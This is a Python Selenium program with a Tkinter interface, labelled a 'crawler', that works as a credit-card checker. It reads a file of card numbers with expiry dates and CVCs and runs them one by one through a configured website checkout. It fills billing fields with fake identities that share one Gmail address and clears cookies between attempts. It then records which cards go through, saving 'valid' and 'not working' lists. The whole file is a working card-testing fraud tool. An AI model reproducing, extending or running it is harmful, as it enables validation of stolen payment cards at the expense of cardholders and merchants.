import os
import time
import logging
import argparse
import random
import json
import threading
import tkinter as tk
from tkinter import ttk, filedialog
from abc import ABC, abstractmethod
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import WebDriverException, TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from datetime import datetime

# Constants
DEFAULT_WAIT_TIME = 15
DEFAULT_RESULT_DIR = "results"

# --- Data ---

# Persons Dict - remains the same as before
persons = {
   "John Doe": {
        "name": "John Doe",
        "email": "riotpillou@gmail.com",
        "phone": "1234567890",
        "street": "10 Main St",
        "city": "New York",
        "state": "NY",
        "postal": "10001"
    },
    "Jane Doe": {
        "name": "Jane Doe",
        "email": "riotpillou@gmail.com",
        "phone": "0987654321",
        "street": "11 Main St",
        "city": "New York",
        "state": "NY",
        "postal": "15041"
    },
    "Alice Smith": {
        "name": "Alice Smith",
        "email": "riotpillou@gmail.com",
        "phone": "213-555-9876",
        "street": "45 Oak Avenue",
        "city": "Los Angeles",
        "state": "CA",
        "postal": "90001"
    },
    "Robert Brown": {
        "name": "Robert Brown",
        "email": "riotpillou@gmail.com",
        "phone": "415-777-2345",
        "street": "123 Pine Street",
        "city": "San Francisco",
        "state": "CA",
        "postal": "94102"
    },
      "Emily Davis": {
        "name": "Emily Davis",
        "email": "riotpillou@gmail.com",
        "phone": "773-888-1234",
        "street": "78 Maple Lane",
        "city": "Chicago",
        "state": "IL",
        "postal": "60601"
      }
}


# --- Config and Data Handling ---
class ConfigManager:
    def __init__(self, config_path):
        self.config_path = config_path
        self.config = self._load_and_validate()
        self.start_url = self._get_start_url() # added start_url attribute

    def _load_and_validate(self): # remains the same
        try:
            with open(self.config_path, 'r') as f:
                config = json.load(f)
            # Basic validation (you can add more complex rules)
            if "steps" not in config or not isinstance(config["steps"], list):
                raise ValueError("Invalid configuration: missing 'steps' or not a list")
            return config
        except (FileNotFoundError, json.JSONDecodeError, ValueError) as e:
            logging.error(f"Error loading config: {e}")
            raise

    def get_config(self):
        return self.config

    def get_steps_count(self): # remains the same
         return len(self.config["steps"])

    def _get_start_url(self): # new method to extract start_url
        return self.config.get("start_url", "") # get start_url or default to empty string


class DataExtractor: # remains the same
    def __init__(self, data_path, cc_path):
        self.data_path = data_path
        self.cc_path = cc_path

    def load_data(self):
      with open(self.data_path, "r") as f:
        return f.read().splitlines()

    def load_cc_data(self):
        try: #added try except block
            with open(self.cc_path, "r") as f:
                return f.read().splitlines()
        except FileNotFoundError:
            logging.error(f"Credit card file not found at: {self.cc_path}")
            return []  # Return empty list to avoid errors

    def get_cc_count(self):
        try: # added try except block
            with open(self.cc_path, "r") as f:
                return len(f.read().splitlines())
        except FileNotFoundError:
            logging.error(f"Credit card file not found at: {self.cc_path}")
            return 0


# --- Selenium Setup ---
class DriverFactory: # remains the same
    def create_driver(self):
        try:
            service = Service(executable_path=ChromeDriverManager().install())
            options = webdriver.ChromeOptions()
            prefs = {"profile.managed_default_content_settings.images": 2}
            options.add_experimental_option("prefs", prefs)
            driver = webdriver.Chrome(service=service, options=options)
            logging.info("ChromeDriver setup successfully.")
            return driver
        except WebDriverException as e:
            logging.error(f"Error setting up ChromeDriver: {e}")
            return None

# --- Action Execution ---
class ActionExecutor(ABC): # remains the same
    @abstractmethod
    def execute(self, driver, step, persons, cc_data,working_ccs):
        pass

class SeleniumActionExecutor(ActionExecutor): # remains the same
    def __init__(self):
        pass
    def execute(self, driver, step, persons, cc_data, working_ccs):
        action = step.get("action")
        target_type = step.get("target_type")
        target = step.get("target")
        input_data = step.get("input_data")
        wait_condition = step.get("wait_condition")
        frame_id = step.get("frame_id")
        wait_time = step.get("wait_time", DEFAULT_WAIT_TIME)
        check_type = step.get("check_type")
        check_text = step.get("check_text")
        current_cc = cc_data

        if wait_condition:
            wait_condition_func = self._get_wait_condition(wait_condition)
            by_type = self._get_by_type(target_type)

        if frame_id:
           try:
              frame_element = WebDriverWait(driver, wait_time).until(
                  EC.presence_of_element_located((self._get_by_type(target_type), frame_id))
                )
              driver.switch_to.frame(frame_element)
              logging.info(f"Switched to frame: {frame_id}")
           except Exception as e:
               logging.error(f"Error while switching to frame {frame_id} : {e}")
               return
        try:
           if action == "navigate":
              driver.get(target)
              logging.info(f"Navigated to: {target}")
           elif action == "click":
              if wait_condition:
                  element = WebDriverWait(driver, wait_time).until(
                      wait_condition_func((by_type, target))
                    )
                  element.click()
                  logging.info(f"Clicked element: {target}")
              else:
                  element = driver.find_element(self._get_by_type(target_type), target)
                  element.click()
                  logging.info(f"Clicked element: {target}")

           elif action == "input": # remains the same
            if wait_condition:
                element = WebDriverWait(driver, wait_time).until(
                    wait_condition_func((by_type, target))
                )
                if isinstance(input_data, str) and input_data.startswith("person."):
                    data_key = input_data.split(".")[1]
                    person = random.choice(list(persons.values()))
                    element.clear()
                    element.send_keys(person.get(data_key, ""))
                    logging.info(f"Input: {data_key} from person data into element: {target}")
                elif isinstance(input_data, str) and input_data.startswith("cc."):

                    data_key = input_data.split(".")[1]
                    if isinstance(current_cc, list):
                       cc = current_cc[0].split("|")
                    else:
                      cc = current_cc.split("|")
                    logging.info(f"CC: {cc} ")
                    if data_key == "number":
                        element.send_keys(cc[0])
                    elif data_key == "exp":
                        element.send_keys(cc[1] + cc[2])
                    elif data_key == "cvc":
                        element.send_keys(cc[3])
                    else:
                        element.send_keys(input_data)
                    logging.info(f"Input {data_key} from credit card data into element: {target}")
                elif input_data:
                    element.send_keys(input_data)
                    logging.info(f"Input '{input_data}' into element: {target}")
            else:
                element = driver.find_element(self._get_by_type(target_type), target)
                if isinstance(input_data, str) and input_data.startswith("person."):
                    data_key = input_data.split(".")[1]
                    person = random.choice(list(persons.values()))
                    element.send_keys(person.get(data_key, ""))
                    logging.info(f"Input: {data_key} from person data into element: {target}")
                elif isinstance(input_data, str) and input_data.startswith("cc."):
                    if isinstance(current_cc, list):
                       cc = current_cc[0].split("|")
                    else:
                      cc = current_cc.split("|")
                    data_key = input_data.split(".")[1]
                    if data_key == "number":
                        element.send_keys(cc[0])
                    elif data_key == "exp":
                        mm = cc[1].replace("20", "")
                        element.send_keys(mm)
                    elif data_key == "cvc":
                        element.send_keys(cc[3])
                    else:
                        element.send_keys(input_data)

                    logging.info(f"Input {data_key} from credit card data into element: {target}")
                elif input_data:
                    element.send_keys(input_data)
                    logging.info(f"Input '{input_data}' into element: {target}")
           elif action == "switch_frame": # remains the same
                try:
                    driver.switch_to.default_content()
                    iframe_element = WebDriverWait(driver, wait_time).until(
                        EC.presence_of_element_located((self._get_by_type(target_type), target))
                    )
                    driver.switch_to.frame(iframe_element)
                    logging.info(f"Switched to frame: {target}")
                except Exception as e:
                    logging.error(f"Error while switching to frame {target} : {e}")
           elif action == "switch_to_default": # remains the same
              driver.switch_to.default_content()
              logging.info("Switched to default content")
           elif action == "get_elements_and_click": # remains the same
              if wait_condition:
                  elements = WebDriverWait(driver, wait_time).until(
                      wait_condition_func((by_type, target))
                    )
                  if elements:
                      elements[0].click()
                      logging.info(f"Clicked element: {target}")
              else:
                elements = driver.find_elements(self._get_by_type(target_type), target)
                if elements:
                  elements[0].click()
                  logging.info(f"Clicked element: {target}")

           elif action == "check_card": # remains the same
            if check_type == "click":
                try:
                    element = WebDriverWait(driver, wait_time).until(
                        wait_condition_func((by_type, target))
                    )
                    element.click()
                    logging.info(f"Card works clicked on element: {target}")
                    if isinstance(current_cc, list):
                        working_ccs.append(current_cc[0])
                    else:
                        working_ccs.append(current_cc)
                except TimeoutException:
                    logging.info(f"Card does not work: {target}")
            elif check_type == "text":
                try:
                    element = WebDriverWait(driver, wait_time).until(
                        wait_condition_func((by_type, target), check_text)
                    )
                    if element:
                        logging.info(f"Card works text found: {target}")
                        if isinstance(current_cc, list):
                            working_ccs.append(current_cc[0])
                        else:
                            working_ccs.append(current_cc)
                    else:
                        logging.info(f"Card does not work text not found: {target}")
                except TimeoutException:
                    logging.info(f"Card does not work: {target}")
        except WebDriverException as e:
            logging.error(f"Error executing action '{action}' on target '{target}': {e}")
        if frame_id:
            driver.switch_to.default_content()

    def _get_by_type(self, target_type): # remains the same
        if target_type == "id":
            return By.ID
        elif target_type == "name":
            return By.NAME
        elif target_type == "class":
            return By.CLASS_NAME
        elif target_type == "css":
            return By.CSS_SELECTOR
        elif target_type == "xpath":
            return By.XPATH
        else:
           raise ValueError(f"Unsupported target type: {target_type}")

    def _get_wait_condition(self, wait_condition): # remains the same
        if wait_condition == "presence_of_element_located":
           return EC.presence_of_element_located
        elif wait_condition == "element_to_be_clickable":
            return EC.element_to_be_clickable
        elif wait_condition == "presence_of_all_elements_located":
            return EC.presence_of_all_elements_located
        elif wait_condition == "text_to_be_present_in_element":
            return EC.text_to_be_present_in_element
        else:
            raise ValueError(f"Unsupported wait condition: {wait_condition}")


# --- Result Handling ---
class ResultManager: # remains the same
   def __init__(self,results_dir):
        self.results_dir = results_dir
        os.makedirs(self.results_dir, exist_ok=True)
        self.crawler_logger = logging.getLogger('crawler_logger') # separate logger for crawler logs
        self.error_logger = logging.getLogger('error_logger') # separate logger for errors

        # Crawler log file handler
        crawler_log_file = os.path.join(self.results_dir, f"crawler-{datetime.now().strftime('%Y%m%d%H%M%S')}.log") # timestamped log file
        crawler_file_handler = logging.FileHandler(crawler_log_file)
        crawler_file_handler.setLevel(logging.INFO)
        crawler_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        crawler_file_handler.setFormatter(crawler_formatter)
        self.crawler_logger.addHandler(crawler_file_handler)

        # Error log file handler
        error_log_file = os.path.join(self.results_dir, f"error-{datetime.now().strftime('%Y%m%d%H%M%S')}.log") # timestamped error log file
        error_file_handler = logging.FileHandler(error_log_file)
        error_file_handler.setLevel(logging.ERROR)
        error_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        error_file_handler.setFormatter(error_formatter)
        self.error_logger.addHandler(error_file_handler)

   def save_results(self, working_ccs, not_working_ccs):
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        valid_file = os.path.join(self.results_dir, f"valid-{timestamp}.txt")
        not_valid_file = os.path.join(self.results_dir, f"notWorking-{timestamp}.txt")
        if working_ccs:
          with open(valid_file, "w") as f:
            f.write("\n".join(working_ccs))
          self.crawler_logger.info(f"Working credit cards saved to: {valid_file}") # log to crawler logger

        if not_working_ccs:
          with open(not_valid_file, "w") as f:
            f.write("\n".join(not_working_ccs))
          self.crawler_logger.info(f"Not working credit cards saved to: {not_valid_file}") # log to crawler logger

   def get_results_count(self,working_ccs,not_working_ccs):
      return str(len(working_ccs)),str(len(not_working_ccs))

# --- Crawler Orchestration ---
class Crawler: # updated to use the separate loggers
    def __init__(self, config_manager, driver_factory, action_executor, data_extractor, result_manager):
        self.config_manager = config_manager
        self.driver_factory = driver_factory
        self.action_executor = action_executor
        self.data_extractor = data_extractor
        self.result_manager = result_manager
        self.crawler_logger = result_manager.crawler_logger  # Use ResultManager's crawler logger
        self.error_logger = result_manager.error_logger # Use ResultManager's error logger
        self.driver = None

    def run(self, url_input, valid_ccs_var, not_valid_ccs_var, imported_ccs_var, stop_event, checked_ccs_var):  # removed log_text
        try:
            self.driver = self.driver_factory.create_driver()
            if not self.driver:
                return

            config = self.config_manager.get_config()
            cc_data = self.data_extractor.load_cc_data()
            imported_ccs_var.set(str(len(cc_data)))  # Update imported CCs count in GUI
            working_ccs = []
            not_working_ccs = []
            processed_count = 0  # new counter for already checked

            if not cc_data:  # handle empty cc_data
                self.error_logger.error("No credit card data loaded. Please check cc.txt file.")
                return

            while not stop_event.is_set():
                try:
                    for cc in cc_data:
                        if stop_event.is_set():
                            break
                        url_to_navigate = url_input  # Get the URL that will be used
                        # Validate URL: prepend http:// if missing
                        if not (url_to_navigate.startswith("http://") or url_to_navigate.startswith("https://")):
                            url_to_navigate = "http://" + url_to_navigate
                        self.crawler_logger.info(f"Navigating to URL: {url_to_navigate}")  # Log the URL
                        self.driver.get(url_to_navigate)
                        for step in config["steps"]:
                            if stop_event.is_set():
                                break
                            self.action_executor.execute(self.driver, step, persons, [cc], working_ccs)
                        self.driver.delete_all_cookies()
                        processed_count += 1
                        checked_ccs_var.set(str(processed_count))
                        valid_ccs_var.set(str(len(working_ccs)))
                        # Real-time invalid count: processed minus working ones
                        not_valid = processed_count - len(working_ccs)
                        not_valid_ccs_var.set(str(not_valid))
                    if stop_event.is_set():
                        break
                    not_working_ccs = [cc for cc in cc_data if cc not in working_ccs]
                    self.result_manager.save_results(working_ccs, not_working_ccs)
                    valid_c, not_valid_c = self.result_manager.get_results_count(working_ccs, not_working_ccs)
                    valid_ccs_var.set(valid_c)  # update valid ccs count on gui
                    not_valid_ccs_var.set(not_valid_c)  # update not valid ccs count on gui
                    self.crawler_logger.info("All credit cards tested.")  # log to crawler logger
                    break

                except WebDriverException as e:
                    self.error_logger.error(f"WebDriverException during navigation: {e}")  # log error to error logger
                    break
        except Exception as e:
            self.error_logger.error(f"Exception during crawler execution: {e}")  # log error to error logger

        finally:
            if self.driver:
                self.driver.quit()
                self.crawler_logger.info("ChromeDriver closed.")  # log to crawler logger

# --- GUI ---
class TkinterGUI:  # ...existing __init__ code...
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("Selenium Crawler")
        self.window.geometry("800x400")
        self.window.configure(bg="#f0f0f0")
        # Variables
        self.config_path_var = tk.StringVar()
        self.cc_path_var = tk.StringVar()
        self.url_var = tk.StringVar()
        self.valid_ccs = tk.StringVar(value="0")
        self.not_valid_ccs = tk.StringVar(value="0")
        self.steps_count = tk.StringVar(value="0")
        self.cc_count = tk.StringVar(value="0")
        self.imported_ccs = tk.StringVar(value="0")
        self.timer_text = tk.StringVar(value="00:00:00")
        # New variable for already checked count
        self.checked_ccs = tk.StringVar(value="0")
        self.stop_event = threading.Event()
        # UI elements
        self._create_widgets()

    def _create_widgets(self):
      # Input Frame
      input_frame = ttk.LabelFrame(self.window, text="Configuration", padding=(10,10)) # corrected
      input_frame.pack(fill=tk.X, padx=10, pady=10)

      # Config path
      config_label = ttk.Label(input_frame, text="Config File:")
      config_label.grid(row=0, column=0, sticky=tk.W, pady=5)
      config_entry = ttk.Entry(input_frame, textvariable=self.config_path_var, width = 50)
      config_entry.grid(row=0, column=1, sticky=tk.W, padx=5)
      config_button = ttk.Button(input_frame, text="Browse", command=lambda: self.browse_config_file(self.config_path_var))
      config_button.grid(row=0,column=2,sticky=tk.W,padx=5)
       # CC path
      cc_label = ttk.Label(input_frame, text="CC File:")
      cc_label.grid(row=1, column=0, sticky=tk.W, pady=5)
      cc_entry = ttk.Entry(input_frame, textvariable=self.cc_path_var, width = 50)
      cc_entry.grid(row=1, column=1, sticky=tk.W, padx=5)
      cc_button = ttk.Button(input_frame, text="Browse", command=lambda: self.browse_config_file(self.cc_path_var))
      cc_button.grid(row=1,column=2,sticky=tk.W,padx=5)
        # Url Display from config (read-only)
      url_label = ttk.Label(input_frame, text="URL:")
      url_label.grid(row=2, column=0, sticky=tk.W, pady=5)
      url_display = ttk.Label(input_frame, textvariable=self.url_var, relief="sunken", width=50)
      url_display.grid(row=2, column=1, sticky=tk.W, padx=5)

      # Indicators Frame - new frame for indicators
      indicators_frame = ttk.Frame(input_frame, padding=5) # padding for visual space
      indicators_frame.grid(row=3, column=0, columnspan=3, sticky=tk.EW) # span across 3 columns

      # Steps Count Indicator
      steps_indicator_label = ttk.Label(indicators_frame, text="Steps:", font=("Arial", 10, "bold"))
      steps_indicator_label.pack(side=tk.LEFT, padx=5)
      steps_indicator_count = ttk.Label(indicators_frame, textvariable=self.steps_count)
      steps_indicator_count.pack(side=tk.LEFT, padx=5)

      # CC Count Indicator
      cc_indicator_label = ttk.Label(indicators_frame, text="CCs to Check:", font=("Arial", 10, "bold"))
      cc_indicator_label.pack(side=tk.LEFT, padx=5)
      cc_indicator_count = ttk.Label(indicators_frame, textvariable=self.cc_count)
      cc_indicator_count.pack(side=tk.LEFT, padx=5)

      # Buttons Frame - remains the same
      button_frame = ttk.Frame(self.window, padding=(10,10)) # corrected
      button_frame.pack(fill=tk.X, padx=10, pady=5)

      # Buttons - remains the same
      start_button = ttk.Button(button_frame, text="Start Crawler", command=self.start_crawler, style='Custom.TButton')
      start_button.pack(side=tk.LEFT, padx=5)

      stop_button = ttk.Button(button_frame, text="Stop Crawler", command=self.stop_crawler , style='Custom.TButton')
      stop_button.pack(side=tk.LEFT, padx=5)

      # Results Frame - updated with imported ccs indicator
      results_frame = ttk.LabelFrame(self.window, text="Results", padding=(10,10)) # corrected
      results_frame.pack(fill=tk.X, padx=10, pady=5)

      # Imported ccs
      imported_label = ttk.Label(results_frame, text="Imported Cards:", font=("Arial", 10, "bold"))
      imported_label.pack(side=tk.LEFT, padx=5)
      imported_cc_label = ttk.Label(results_frame, textvariable=self.imported_ccs,font=("Arial", 10, "bold"), foreground="blue") # blue color
      imported_cc_label.pack(side=tk.LEFT, padx=5)
      # Already checked cards
      checked_label = ttk.Label(results_frame, text="Already Checked:", font=("Arial", 10, "bold"))
      checked_label.pack(side=tk.LEFT, padx=5)
      checked_cc_label = ttk.Label(results_frame, textvariable=self.checked_ccs, font=("Arial", 10, "bold"), foreground="purple")
      checked_cc_label.pack(side=tk.LEFT, padx=5)
      # Valid ccs
      valid_label = ttk.Label(results_frame, text="Valid Cards:", font=("Arial", 10, "bold"))
      valid_label.pack(side=tk.LEFT, padx=5)
      valid_cc_label = ttk.Label(results_frame, textvariable=self.valid_ccs,font=("Arial", 10, "bold"),foreground="green")
      valid_cc_label.pack(side=tk.LEFT, padx=5)
       #Not valid ccs
      not_valid_label = ttk.Label(results_frame, text="Invalid Cards:",font=("Arial", 10, "bold"))
      not_valid_label.pack(side=tk.LEFT, padx=5)
      not_valid_cc_label = ttk.Label(results_frame, textvariable=self.not_valid_ccs,font=("Arial", 10, "bold"),foreground="red")
      not_valid_cc_label.pack(side=tk.LEFT, padx=5)
      # Counters and timer
      counters_frame = ttk.Frame(results_frame, padding=(10,10)) # corrected
      counters_frame.pack(side = tk.RIGHT, padx = 5)
      steps_label = ttk.Label(counters_frame, text="Steps:",font=("Arial", 10, "bold"))
      steps_label.pack(side = tk.LEFT, padx = 5)
      steps_count_label = ttk.Label(counters_frame, textvariable=self.steps_count,font=("Arial", 10, "bold"))
      steps_count_label.pack(side = tk.LEFT,padx = 5)
      cc_label = ttk.Label(counters_frame, text="CCs:",font=("Arial", 10, "bold"))
      cc_label.pack(side = tk.LEFT,padx = 5)
      cc_count_label = ttk.Label(counters_frame, textvariable=self.cc_count,font=("Arial", 10, "bold"))
      cc_count_label.pack(side = tk.LEFT,padx = 5)

      timer_label = ttk.Label(counters_frame, text="Time:",font=("Arial", 10, "bold"))
      timer_label.pack(side = tk.LEFT, padx=5)
      timer_count_label = ttk.Label(counters_frame, textvariable=self.timer_text,font=("Arial", 10, "bold"))
      timer_count_label.pack(side = tk.LEFT, padx = 5)

      # Style - remains the same
      style = ttk.Style()
      style.configure('Custom.TButton', padding=(5, 5))

    def start_crawler(self):
        config_path = self.config_path_var.get()
        cc_path = self.cc_path_var.get()
        self.stop_event.clear()
        config_manager = ConfigManager(config_path)
        driver_factory = DriverFactory()
        action_executor = SeleniumActionExecutor()
        data_extractor = DataExtractor("data.txt", cc_path)
        result_manager = ResultManager(DEFAULT_RESULT_DIR)

        crawler = Crawler(config_manager, driver_factory, action_executor, data_extractor, result_manager)

        # Get the steps count
        try:
            steps_count = config_manager.get_steps_count()
            self.steps_count.set(str(steps_count))
        except Exception as e:
            logging.error(f"Error getting steps count: {e}")
            self.steps_count.set("N/A")

        # Get CC count
        try:
            cc_count = data_extractor.get_cc_count()
            self.cc_count.set(str(cc_count))
            self.imported_ccs.set(str(cc_count))  # set imported ccs to cc count
        except Exception as e:
            logging.error(f"Error getting CC count: {e}")
            self.cc_count.set("N/A")
            self.imported_ccs.set("N/A")  # set imported ccs to N/A if error

        # Always read URL from configuration file
        start_url = config_manager.start_url  
        self.url_var.set(start_url)  # display the URL in the GUI

        self.valid_ccs.set("0")  # reset valid ccs count
        self.not_valid_ccs.set("0")  # reset not valid ccs count
        self.checked_ccs.set("0")  # reset checked count

        # Start timer
        self.start_time = datetime.now()
        self.update_timer()

        threading.Thread(
            target=crawler.run,
            args=(start_url, self.valid_ccs, self.not_valid_ccs, self.imported_ccs, self.stop_event, self.checked_ccs), # Removed self.log_text
            daemon=True
        ).start()

    def update_timer(self): # remains the same
        if not self.stop_event.is_set():
            now = datetime.now()
            elapsed = now - self.start_time
            self.timer_text.set(str(elapsed).split('.')[0])  # Format to HH:MM:SS
            self.window.after(1000, self.update_timer)

    def stop_crawler(self): # remains the samez
        self.stop_event.set()
        logging.info("Stopping Crawler ...")
        logging.getLogger().handlers.clear()

    def browse_config_file(self, file_var): # updated browse config file to handle both config and cc files
      if file_var == self.config_path_var:
        filename = filedialog.askopenfilename(filetypes=(("JSON files", "*.json"),("All files", "*.*")))
      else:
        filename = filedialog.askopenfilename(filetypes=(("Text Files", "*.txt"),("All files", "*.*")))
      file_var.set(filename)

    def run(self): # remains the same
        self.window.mainloop()


# Custom Tkinter Text Handler - removed

# --- Main ---
if __name__ == "__main__":
    gui = TkinterGUI()
    gui.run()
